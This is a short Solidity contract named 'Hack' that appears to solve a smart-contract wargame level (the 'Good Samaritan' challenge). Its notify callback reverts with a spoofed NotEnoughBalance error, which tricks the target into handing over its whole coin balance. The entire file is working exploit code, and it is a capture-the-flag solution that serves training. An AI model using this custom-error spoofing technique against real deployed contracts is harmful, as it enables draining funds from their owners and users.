// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns(uint256);
}

contract Hack {
    error NotEnoughBalance();

    function pwn(IGoodSamaritan target) external {
        target.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}